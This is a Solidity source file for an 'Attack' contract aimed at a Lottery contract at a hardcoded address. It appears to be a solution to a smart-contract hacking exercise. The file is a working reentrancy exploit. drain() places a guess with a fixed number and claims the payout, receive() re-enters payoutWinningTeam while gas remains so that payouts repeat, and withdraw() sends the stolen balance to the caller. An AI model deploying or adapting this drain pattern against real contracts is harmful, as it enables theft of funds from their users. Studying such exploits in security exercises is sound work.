// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";

contract Attack {
    Lottery lottery = Lottery(0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A);
    Oracle or = Oracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3);

    function drain() public {
        uint256 rand = 5;
        lottery.makeAGuess(msg.sender, rand);
        lottery.payoutWinningTeam(msg.sender);
    }

    receive() external payable {
        if (gasleft() > 40_000) {
            lottery.payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        // check if address is correct
        (bool sent,) = address(msg.sender).call.value(address(this).balance)("");
        require(sent,"Withdrawal failed");
    }
}
